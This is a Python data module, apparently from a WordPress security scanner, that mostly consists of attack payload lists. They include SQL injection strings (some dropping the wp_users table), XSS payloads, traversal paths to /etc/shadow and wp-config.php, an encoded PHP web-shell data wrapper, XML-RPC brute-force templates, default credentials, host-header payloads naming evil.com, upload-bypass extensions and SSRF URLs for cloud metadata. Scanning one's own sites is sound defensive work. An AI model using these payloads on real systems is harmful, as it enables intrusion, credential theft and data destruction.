#!/usr/bin/env python3
"""
Attack Payloads Database for WordPress Security Scanner
Contains SQL injection, XSS, LFI, and other attack payloads used by real hackers
"""

# =============================================================================
# BACKUP & CONFIG FILE EXPOSURE PATHS (50+ paths hackers scan for)
# =============================================================================

BACKUP_FILES = [
    # wp-config backups (CRITICAL - contains DB credentials)
    '/wp-config.php.bak',
    '/wp-config.php~',
    '/wp-config.php.old',
    '/wp-config.php.save',
    '/wp-config.php.swp',
    '/wp-config.php.swo',
    '/wp-config.bak',
    '/wp-config.old',
    '/wp-config.txt',
    '/wp-config.php.orig',
    '/wp-config.php.original',
    '/wp-config.php.bkp',
    '/wp-config.php_bak',
    '/wp-config.php.backup',
    '/wp-config.php.0',
    '/wp-config.php.1',
    '/.wp-config.php.swp',
    '/wp-config.php.dist',
    '/wp-config.inc',
    '/wp-config.inc.php',
    '/wp-config-sample.php',

    # Database dumps (CRITICAL)
    '/backup.sql',
    '/db.sql',
    '/database.sql',
    '/dump.sql',
    '/mysql.sql',
    '/data.sql',
    '/db_backup.sql',
    '/site.sql',
    '/wordpress.sql',
    '/backup.sql.gz',
    '/db.sql.zip',
    '/backup.tar.gz',
    '/backup.zip',
    '/export.sql',
    '/dump.sql.gz',
    '/mysql_backup.sql',
    '/wp_backup.sql',

    # WordPress backup paths
    '/wp-content/backup-db/',
    '/wp-content/backups/',
    '/wp-content/backup/',
    '/wp-content/uploads/backups/',
    '/wp-content/updraft/',
    '/wp-content/ai1wm-backups/',
    '/wp-content/backupwordpress-*/',

    # Full site backups
    '/backup.tar',
    '/backup.tar.gz',
    '/backup.zip',
    '/site-backup.zip',
    '/wordpress-backup.zip',
    '/www.zip',
    '/public_html.zip',
    '/htdocs.zip',
    '/website.zip',
    '/full-backup.zip',
    '/complete-backup.zip',

    # Version control (exposes source code history)
    '/.git/config',
    '/.git/HEAD',
    '/.git/index',
    '/.git/logs/HEAD',
    '/.gitignore',
    '/.svn/entries',
    '/.svn/wc.db',
    '/.hg/hgrc',
    '/.bzr/README',

    # IDE/Editor files
    '/.idea/workspace.xml',
    '/.idea/modules.xml',
    '/.vscode/settings.json',
    '/.vscode/launch.json',
    '/sftp-config.json',
    '/.ftpconfig',
    '/.remote-sync.json',
    '/sftp.json',

    # Log files (information disclosure)
    '/debug.log',
    '/error.log',
    '/error_log',
    '/wp-content/debug.log',
    '/logs/error.log',
    '/access.log',
    '/php_error.log',
    '/wp-content/uploads/wc-logs/',
    '/wp-content/uploads/wpforms/',
    '/logs/',
    '/log/',
    '/wp-content/logs/',

    # phpMyAdmin (direct DB access)
    '/phpmyadmin/',
    '/pma/',
    '/myadmin/',
    '/mysql/',
    '/phpMyAdmin/',
    '/phpmyadmin/index.php',
    '/dbadmin/',
    '/sqladmin/',
    '/mysqlmanager/',
    '/sql/',
    '/db/',
    '/admin/phpmyadmin/',

    # Info disclosure
    '/phpinfo.php',
    '/info.php',
    '/test.php',
    '/i.php',
    '/php.ini',
    '/.user.ini',
    '/php.ini.bak',

    # Environment files
    '/.env',
    '/.env.local',
    '/.env.production',
    '/.env.development',
    '/.env.staging',
    '/.env.backup',
    '/.env.example',
    '/.env.save',

    # Composer/Package files
    '/composer.json',
    '/composer.lock',
    '/package.json',
    '/yarn.lock',
    '/package-lock.json',
    '/vendor/autoload.php',

    # Server config
    '/.htpasswd',
    '/.htaccess.bak',
    '/.htaccess.old',
    '/.htaccess~',
    '/web.config',
    '/crossdomain.xml',
    '/clientaccesspolicy.xml',

    # Other sensitive
    '/readme.html',
    '/license.txt',
    '/wp-admin/install.php',
    '/wp-admin/setup-config.php',
    '/xmlrpc.php',
    '/wp-cron.php',
    '/wp-config-local.php',
    '/local-config.php',
    '/production-config.php',
]

# =============================================================================
# SQL INJECTION PAYLOADS
# =============================================================================

SQL_PAYLOADS = [
    # Basic SQL injection tests
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",

    # Numeric injection
    "1 OR 1=1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' AND 1=1--",
    "1 AND 1=2",
    "-1 OR 1=1",

    # UNION-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4,5--",
    "1' UNION SELECT null,null,null--",
    "1' UNION ALL SELECT 1,2,3--",

    # Time-based blind injection
    "1' AND SLEEP(5)--",
    "1' OR SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT SLEEP(5))--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",

    # Error-based injection
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # Boolean-based blind
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND 'a'='a",
    "1' AND 'a'='b",

    # Stacked queries
    "1; DROP TABLE users--",
    "1'; DROP TABLE wp_users--",
    "1; SELECT * FROM users--",

    # WordPress-specific
    "1' AND (SELECT user_login FROM wp_users LIMIT 1)='admin'--",
    "1' AND (SELECT COUNT(*) FROM wp_users)>0--",
]

# WordPress-specific injection points
SQL_INJECTION_POINTS = [
    '/?p=',
    '/?page_id=',
    '/?cat=',
    '/?author=',
    '/?s=',
    '/?tag=',
    '/?attachment_id=',
    '/?year=',
    '/?monthnum=',
    '/?day=',
    '/?w=',
    '/?paged=',
    '/wp-admin/admin-ajax.php?action=',
    '/wp-admin/admin-post.php?action=',
    '/?orderby=',
    '/?order=',
]

# =============================================================================
# XSS PAYLOADS
# =============================================================================

XSS_PAYLOADS = [
    # Basic script injection
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',

    # Attribute breaking
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "'+alert(1)+'",
    '"><img src=x onerror=alert(1)>',
    "' onclick=alert(1)//",
    '" onfocus=alert(1) autofocus="',

    # Image-based XSS
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<img/src=x onerror=alert(1)>',
    '<img src=x:alert(alt) onerror=eval(src) alt=1>',

    # SVG-based XSS
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload="alert(1)">',
    '<svg><script>alert(1)</script></svg>',

    # Event handlers
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',

    # JavaScript protocol
    'javascript:alert(1)',
    'javascript:alert(document.domain)',
    'javascript://alert(1)',
    'data:text/html,<script>alert(1)</script>',

    # Encoded payloads
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',

    # Bypass attempts
    '<ScRiPt>alert(1)</ScRiPt>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<script/src=data:,alert(1)>',
    '<script>alert`1`</script>',

    # DOM-based
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
]

# XSS injection points in WordPress
XSS_INJECTION_POINTS = [
    '/?s=',  # Search form
    '/wp-login.php?redirect_to=',  # Login redirect
    '/wp-comments-post.php',  # Comment form
    '/wp-admin/admin-ajax.php',  # AJAX handlers
    '/?author=',  # Author parameter
    '/wp-login.php?action=lostpassword&user_login=',  # Password reset
]

# =============================================================================
# LOCAL FILE INCLUSION (LFI) PAYLOADS
# =============================================================================

LFI_PAYLOADS = [
    # Basic traversal
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '../../../etc/shadow',
    '../../../etc/hosts',

    # Null byte bypass (older PHP)
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.php',

    # Double encoding
    '..%252f..%252f..%252fetc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',

    # WordPress specific files
    '../../../wp-config.php',
    '....//....//....//wp-config.php',
    '../wp-config.php',
    '../../wp-config.php',
    '../../../wp-includes/version.php',

    # PHP wrappers
    'php://filter/convert.base64-encode/resource=wp-config.php',
    'php://filter/convert.base64-encode/resource=../wp-config.php',
    'php://filter/convert.base64-encode/resource=../../wp-config.php',
    'php://filter/read=string.rot13/resource=wp-config.php',
    'php://input',
    'php://filter/resource=/etc/passwd',

    # Data wrapper
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==',

    # Expect wrapper (if enabled)
    'expect://id',

    # Log file poisoning paths
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/proc/self/environ',
    '/proc/self/fd/0',
    '/proc/self/fd/1',
    '/proc/self/fd/2',

    # Windows paths (if applicable)
    '..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
]

# =============================================================================
# XML-RPC ATTACK PAYLOADS
# =============================================================================

XMLRPC_LIST_METHODS = '''<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>'''

XMLRPC_MULTICALL_TEMPLATE = '''<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
                        {calls}
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>'''

XMLRPC_GET_USERS_BLOGS = '''<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value>{username}</value></param>
        <param><value>{password}</value></param>
    </params>
</methodCall>'''

XMLRPC_PINGBACK_REQUEST = '''<?xml version="1.0"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>{source_url}</string></value></param>
        <param><value><string>{target_url}</string></value></param>
    </params>
</methodCall>'''

XMLRPC_DEMO_FUNCTION = '''<?xml version="1.0"?>
<methodCall>
    <methodName>demo.sayHello</methodName>
    <params></params>
</methodCall>'''

# =============================================================================
# DEFAULT/COMMON CREDENTIALS
# =============================================================================

DEFAULT_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'Admin123'),
    ('admin', 'password'),
    ('admin', 'Password1'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('admin', 'wordpress'),
    ('admin', 'wp-admin'),
    ('administrator', 'administrator'),
    ('administrator', 'admin'),
    ('root', 'root'),
    ('root', 'password'),
    ('user', 'user'),
    ('test', 'test'),
    ('demo', 'demo'),
    ('guest', 'guest'),
]

# Common weak passwords to test
COMMON_PASSWORDS = [
    'password', 'Password1', 'Password123', 'admin', 'admin123',
    '123456', '12345678', '123456789', 'qwerty', 'abc123',
    'password1', 'password123', 'admin@123', 'letmein', 'welcome',
    'monkey', '1234567', '111111', 'shadow', 'sunshine',
    'wordpress', 'wp-admin', 'changeme', 'secret', 'master',
]

# =============================================================================
# HOST HEADER INJECTION PAYLOADS
# =============================================================================

HOST_HEADER_PAYLOADS = [
    {'Host': 'evil.com'},
    {'Host': 'localhost'},
    {'Host': '127.0.0.1'},
    {'X-Forwarded-Host': 'evil.com'},
    {'X-Host': 'evil.com'},
    {'X-Forwarded-Server': 'evil.com'},
    {'X-Original-URL': '/admin'},
    {'X-Rewrite-URL': '/admin'},
]

# =============================================================================
# FILE UPLOAD BYPASS PAYLOADS
# =============================================================================

FILE_UPLOAD_EXTENSIONS = [
    # PHP extensions
    '.php', '.php3', '.php4', '.php5', '.php7', '.phtml', '.pht', '.phps',
    '.phar', '.phpt', '.pgif', '.phtm',

    # Double extensions
    '.php.jpg', '.php.png', '.php.gif', '.php.txt',
    '.jpg.php', '.png.php', '.gif.php',

    # Null byte
    '.php%00.jpg', '.php%00.png',

    # Case variations
    '.PHP', '.Php', '.pHP', '.PhP',

    # Apache handler bypass
    '.htaccess',

    # Other dangerous
    '.asp', '.aspx', '.jsp', '.jspx', '.cgi', '.pl', '.py',
]

# Content-Type bypass attempts
CONTENT_TYPE_BYPASS = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/octet-stream',
    'text/plain',
]

# =============================================================================
# REST API ENDPOINTS TO CHECK
# =============================================================================

REST_API_ENDPOINTS = [
    '/wp-json/',
    '/wp-json/wp/v2/',
    '/wp-json/wp/v2/users',
    '/wp-json/wp/v2/users?per_page=100',
    '/wp-json/wp/v2/posts',
    '/wp-json/wp/v2/posts?status=draft',
    '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/media',
    '/wp-json/wp/v2/comments',
    '/wp-json/wp/v2/categories',
    '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/settings',
    '/wp-json/oembed/1.0/',
    '/wp-json/wp/v2/types',
    '/wp-json/wp/v2/statuses',
    '/wp-json/wp/v2/taxonomies',
    '/?rest_route=/wp/v2/users',
    '/?rest_route=/wp/v2/posts',
]

# =============================================================================
# DIRECTORY TRAVERSAL PATHS
# =============================================================================

DIRECTORY_TRAVERSAL_PAYLOADS = [
    '../',
    '..\\',
    '..%2f',
    '..%5c',
    '%2e%2e%2f',
    '%2e%2e/',
    '..%252f',
    '%252e%252e%252f',
    '....//....//....//....//....',
    '....//',
    '....\\\\',
]

# =============================================================================
# SSRF PAYLOADS (for pingback testing)
# =============================================================================

SSRF_TEST_URLS = [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://[::1]/',
    'http://0.0.0.0/',
    'http://0/',
    'http://127.1/',
    'http://127.0.1/',
    'http://169.254.169.254/',  # AWS metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/',  # GCP metadata
    'http://100.100.100.200/latest/meta-data/',  # Alibaba metadata
]

# =============================================================================
# HTTP METHODS TO TEST
# =============================================================================

HTTP_METHODS_TO_TEST = [
    'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD',
    'TRACE', 'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY',
    'MOVE', 'LOCK', 'UNLOCK',
]

# =============================================================================
# SECURITY HEADERS TO CHECK
# =============================================================================

SECURITY_HEADERS = {
    'X-Frame-Options': {
        'description': 'Clickjacking protection',
        'recommended': ['DENY', 'SAMEORIGIN'],
        'severity': 'MEDIUM'
    },
    'X-Content-Type-Options': {
        'description': 'MIME-type sniffing protection',
        'recommended': ['nosniff'],
        'severity': 'LOW'
    },
    'Strict-Transport-Security': {
        'description': 'HTTP Strict Transport Security',
        'recommended': ['max-age=31536000'],
        'severity': 'MEDIUM'
    },
    'Content-Security-Policy': {
        'description': 'Content Security Policy',
        'recommended': [],
        'severity': 'MEDIUM'
    },
    'X-XSS-Protection': {
        'description': 'XSS filter protection',
        'recommended': ['1; mode=block'],
        'severity': 'LOW'
    },
    'Referrer-Policy': {
        'description': 'Referrer information control',
        'recommended': ['strict-origin-when-cross-origin', 'no-referrer'],
        'severity': 'LOW'
    },
    'Permissions-Policy': {
        'description': 'Browser feature permissions',
        'recommended': [],
        'severity': 'LOW'
    }
}
